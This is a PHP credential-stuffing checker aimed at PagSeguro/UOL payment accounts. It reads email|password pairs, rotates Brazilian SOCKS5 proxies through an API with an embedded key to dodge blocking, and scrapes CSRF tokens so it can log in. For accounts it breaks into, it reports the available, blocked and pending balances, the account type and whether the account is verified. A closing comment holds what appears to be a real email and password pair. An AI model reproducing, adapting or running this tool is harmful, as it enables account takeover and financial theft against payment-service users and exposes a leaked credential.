<?php
session_start();
 if(!$_SESSION['user'] == "paladino" and !$_SESSION['pass'] == "paladino"){  
   echo "<script>location.href='../'</script>";
 }
extract($_GET);
$lista = str_replace(" " , "", $lista);
$separar = explode("|", $lista);
$email = $separar[0];
$senha = $separar[1];


function checkProxy($proxy) {
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, "http://www.cpanel.net/showip.cgi");
    curl_setopt($ch, CURLOPT_TIMEOUT, 20);
    curl_setopt($ch, CURLOPT_PROXY, trim($proxy));
    curl_setopt($ch, CURLOPT_PROXYTYPE, CURLPROXY_SOCKS5);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, TRUE);
    $result = curl_exec($ch);
    if ($result !== FALSE) {
        return true;
    } else {
        return false;
    }
    curl_close($ch);
}

function getProxy() {

    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, 'https://gimmeproxy.com/api/getProxy?api_key=0351ecb4-4ede-41b5-bb05-e2a81fbdfed6&protocol=socks5&country=BR');
    curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
    curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
    curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/ml.txt');
    curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/ml.txt');
    $proxy = curl_exec($ch);
    $proxy = json_decode($proxy);

    return $proxy->ipPort;
}



function getStr($string, $start, $end) {
    $str = explode($start, $string);
    $str = explode($end, $str[1]);
    return $str[0];
}


if(file_exists(getcwd().'/pagseguro.txt')) {
        unlink(getcwd().'/pagseguro.txt'); 
    }

$ch = curl_init();

$proxy = getProxy();
while (!checkProxy($proxy)) {
    $proxy = getProxy();
}


curl_setopt($ch, CURLOPT_URL, "https://acesso.uol.com.br/login.html?skin=ps");
curl_setopt($ch, CURLOPT_PROXY, trim($proxy));
curl_setopt($ch, CURLOPT_PROXYTYPE, CURLPROXY_SOCKS5);
curl_setopt($ch, CURLOPT_HEADER, 1);
curl_setopt($ch, CURLOPT_NOBODY, false);
curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_COOKIESESSION, false );
curl_setopt($ch, CURLOPT_ENCODING, 'gzip');
curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookies/pagseguro.txt');
curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/cookies/pagseguro.txt');
curl_setopt($ch, CURLOPT_REFERER, 'https://acesso.uol.com.br/login.html?skin=ps');
curl_setopt($ch, CURLOPT_VERBOSE, 1);
$d1 = curl_exec($ch);
$token = getStr($d1,'type="hidden" name="acsrfToken" value="','"');
curl_setopt($ch, CURLOPT_URL, "https://acesso.uol.com.br/login.html?skin=ps");
curl_setopt($ch, CURLOPT_PROXY, trim($proxy));
curl_setopt($ch, CURLOPT_PROXYTYPE, CURLPROXY_SOCKS5);
curl_setopt($ch, CURLOPT_HEADER, 1);
curl_setopt($ch, CURLOPT_NOBODY, false);
curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_COOKIESESSION, false );
curl_setopt($ch, CURLOPT_ENCODING, 'gzip');
curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookies/pagseguro.txt');
curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/cookies/pagseguro.txt');
curl_setopt($ch, CURLOPT_REFERER, 'https://acesso.uol.com.br/login.html?skin=ps');
curl_setopt($ch, CURLOPT_VERBOSE, 1);
curl_setopt($ch, CURLOPT_POST, 1);                 
curl_setopt($ch, CURLOPT_POSTFIELDS, 'dest=REDIR%7Chttps%3A%2F%2Fpagseguro.uol.com.br%2F&deviceId=&skin=ps&user='.$email.'&pass='.$senha.'&entrar=');
$d2 = curl_exec($ch);

curl_close($ch);
if(strpos($d2, 'O e-mail ou senha informados')){
    echo '<span class="label label-danger">#Reprovada - Bloqueado ❌ '. $email .' | '. $senha .' |  #SH4DOWD3V-SH3CK3R<br></span>';

}
elseif(stripos($d2, 'Comprar')){

$ch = curl_init();

$proxy = getProxy();
while (!checkProxy($proxy)) {
    $proxy = getProxy();
}

$loadtime = time();

curl_setopt($ch, CURLOPT_URL, "https://pagseguro.uol.com.br/account/wallet.jhtml");
curl_setopt($ch, CURLOPT_PROXY, trim($proxy));
curl_setopt($ch, CURLOPT_PROXYTYPE, CURLPROXY_SOCKS5);
curl_setopt($ch, CURLOPT_HEADER, 1);
curl_setopt($ch, CURLOPT_NOBODY, false);
curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_COOKIESESSION, false );
curl_setopt($ch, CURLOPT_ENCODING, 'gzip');
curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookies/pagseguro.txt');
curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/cookies/pagseguro.txt');
curl_setopt($ch, CURLOPT_REFERER, 'https://pagseguro.uol.com.br/login.jhtml');
curl_setopt($ch, CURLOPT_VERBOSE, 1);
$d3 = curl_exec($ch);
$token = getStr($d3,'type="hidden" name="acsrfToken" value="','"');

$proxy = getProxy();
while (!checkProxy($proxy)) {
    $proxy = getProxy();
}

curl_setopt($ch, CURLOPT_URL, "https://pagseguro.uol.com.br/login.jhtml");
curl_setopt($ch, CURLOPT_PROXY, trim($proxy));
curl_setopt($ch, CURLOPT_PROXYTYPE, CURLPROXY_SOCKS5);
curl_setopt($ch, CURLOPT_HEADER, 1);
curl_setopt($ch, CURLOPT_NOBODY, false);
curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_COOKIESESSION, false );
curl_setopt($ch, CURLOPT_ENCODING, 'gzip');
curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookies/pagseguro.txt');
curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/cookies/pagseguro.txt');
curl_setopt($ch, CURLOPT_REFERER, 'https://pagseguro.uol.com.br/login.jhtml');
curl_setopt($ch, CURLOPT_VERBOSE, 1);
curl_setopt($ch, CURLOPT_POST, 1);                 
curl_setopt($ch, CURLOPT_POSTFIELDS, 'dest=+REDIR%7Chttps://pagseguro.uol.com.br/hub.jhtml&skin=&acsrfToken='.$token.'&user='.$email.'&pass='.$senha.'');
$d4 = curl_exec($ch);
        if(strpos($d4, 'verificar conta')){
            $verificada = "Nao";
        }else{
            $verificada = "Sim";
        }
        $tipo = getStr($d4,'href="/account/viewDetails.jhtml" title="','"');
        $disponivel = getStr($d4,'<dd id="accountBalance" class="positive">','</dd>');
        if ($disponivel == false) {
            $disponivel = "0,00";
        }
        $bloqueado = getStr($d4,'<dd id="accountBlocked" class="neutral">','</dd>');
        if ($bloqueado == false) {
            $bloqueado = "0,00";
        }
        $receber = getStr($d4,'<dd id="accountEscrow" class="neutral">','</dd>');
        if ($receber == false) {
            $receber = "0,00";
        }

$loadtime = time();
$data = date("d/m/Y H:i:s");

   if(stripos($d4, '<div class="logged-user-info">')){

    echo '<span style="width:100% !important" class="label label-success">#Aprovada ✅ '.$email.'|'.$senha.' Informaçoes |</br> Disponivel: R$ '.$disponivel.' | Receber: '.$receber.' | Bloqueado: '.$bloqueado.' | Tipo: '.$tipo.' | Verificada: '.$verificada.' | PROXY :  '. $proxy . '(' . (time() - $loadtime) .  ' seg) | DATA: '.$data. ' | #SH4DOWD3V-SH3CK3R</span> <br>';
                  
}
else {


    echo '<span class="label label-danger">#Reprovada - Bloqueado ❌ '. $email .' | '. $senha .' | PROXY :  '. $proxy . '(' . (time() - $loadtime) .  ' seg) | DATA: '.$data. ' |  #SH4DOWD3V-SH3CK3R<br></span>';
}
flush();
ob_flush();
}
//canalgeekgame@gmail.com|Renato96475870
?>